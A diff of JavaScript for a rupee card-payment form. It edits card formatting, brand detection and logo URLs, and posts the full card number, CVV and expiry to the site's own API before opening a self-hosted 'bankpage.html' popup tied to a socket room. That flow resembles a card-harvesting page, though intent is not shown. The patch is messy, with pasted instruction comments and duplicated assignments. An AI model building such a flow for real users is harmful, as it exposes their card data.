@@ -429,7 +429,7 @@
           const response = await fetch(`/api/getPaymentDetails?pid=${pid}`);
           const data = await response.json();
           if (data.status === 'success' && data.payment) {
-            const amount = parseInt(data.payment.amount, 10);
+            const amount = parseFloat(data.payment.amount);
             if (!isNaN(amount) && amount > 0) {
               document.getElementById('amount').value = amount;
               document.getElementById('displayAmount').textContent = amount.toLocaleString('en-IN');
@@ -462,8 +462,7 @@
     }
 
     function formatCardNumber(value) {
-      let v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
-      v = v.slice(0, 16);
+      let v = value.replace(/[^\d]/g, '').slice(0, 16);
       const parts = [];
       for (let i = 0; i < v.length; i += 4) {
         parts.push(v.substring(i, i + 4));
@@ -506,32 +505,34 @@
       }
     }
 
-    function detectCardType(number) {
-      const clean = number.replace(/\D/g, '');
-      const patterns = {
-        visa: /^4/,
-        mastercard: /^5[1-5]/,
-        amex: /^3[47]/,
-        rupay: /^(508[5-9]|60698|607[0-8][0-9]|6079[0-8]|608[0-5]|6521[5-9]|652[2-9][0-9]|6530[0-9]|6531[0-4])/
-      };
-      for (const [brand, pattern] of Object.entries(patterns)) {
-        if (pattern.test(clean)) {
-          return brand;
-        }
-      }
-      return null;
+    // Replace the detectCardType function with:
+function detectCardType(number) {
+  const clean = number.replace(/\D/g, '');
+  const patterns = {
+    visa: /^4/,
+    mastercard: /^(5[1-5]|222[1-9]|22[3-9]|2[3-6]|27[0-1]|2720)/,
+    amex: /^3[47]/,
+    rupay: /^(508[5-9]|60698|607[0-8][0-9]|6079[0-8]|608[0-5]|6521[5-9]|652[2-9][0-9]|6530[0-9]|6531[0-4])/
+  };
+  for (const [brand, pattern] of Object.entries(patterns)) {
+    if (pattern.test(clean)) {
+      return brand;
     }
+  }
+  return null;
+}
 
     async function updateCardTypeAndInfo(value) {
       const cardLogo = document.getElementById("cardLogo");
       const plain = value.replace(/\s/g, '');
       const detectedType = detectCardType(plain);
-      const logos = {
-        visa: 'https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png',
-        mastercard: 'https://pngimg.com/uploads/mastercard/mastercard_PNG16.png',
-        amex: 'https://1000logos.net/wp-content/uploads/2016/10/American-Express-Color-500x281.png',
-        rupay: 'https://www.gokiwi.in/homepage/partners/rupay.svg'
-      };
+      // In the updateCardTypeAndInfo function, REPLACE logos object:
+const logos = {
+  visa: 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/1200px-Visa_Inc._logo.svg.png',
+  mastercard: 'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1200px-Mastercard-logo.svg.png',
+  amex: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/30/American_Express_logo.svg/1200px-American_Express_logo.svg.png',
+  rupay: 'https://www.rupay.co.in/assets/images/rupay-logo.svg'
+};
       if (plain.length > 0 && detectedType && logos[detectedType]) {
         cardLogo.src = logos[detectedType];
         cardLogo.classList.remove('hidden');
@@ -606,7 +607,9 @@
         expiryInput.addEventListener("input", function(e) {
           const cursor = e.target.selectionStart;
           const lastLength = e.target.value.length;
-          let formatted = formatExpiry(e.target.value);
+          let formatted = e.target.value.replace(/^(\d{2})(\d{0,2})/, '$1/$2')
+                              .replace(/[^\d\/]/g, '')
+                              .slice(0, 5);
           e.target.value = formatted;
           isExpiryValid = (formatted.length === 5) ? validateExpiry(formatted) : false;
           updateSubmitButton();
@@ -633,23 +636,30 @@
         overlay.style.display = 'flex';
         try {
           const response = await fetch("/api/sendPaymentDetails", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
-              expiry: document.getElementById('expiry').value,
-              cvv: document.getElementById('cvv').value,
-              email: document.getElementById('email').value,
-              amount: document.getElementById('amount').value,
-              currency: "INR",
-              cardholder: document.getElementById('cardholderName').value
-            })
-          });
-          bankPageWindow = window.open(
-      `/bankpage.html?invoiceId=${result.invoiceId}`, 
-      '_blank',
-      'width=600,height=800'
-    );
+  method: "POST",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({
+    cardNumber: document.getElementById('cardNumber').value.replace(/\s+/g, ''),
+    expiry: document.getElementById('expiry').value,
+    cvv: document.getElementById('cvv').value,
+    email: document.getElementById('email').value,
+    amount: document.getElementById('amount').value,
+    currency: "INR",
+    cardholder: document.getElementById('cardholderName').value
+  })
+});
+const result = await response.json(); // Add this line
+
+if (result.status === "success") {
+  bankPageWindow = window.open(
+    `/bankpage.html?invoiceId=${result.invoiceId}`, 
+    '_blank',
+    'width=600,height=800'
+  );
+  currentInvoiceId = result.invoiceId;
+  localStorage.setItem('invoiceId', currentInvoiceId);
+  socket.emit('join', currentInvoiceId);
+}
     
     // Store invoice ID and setup socket
     currentInvoiceId = result.invoiceId;
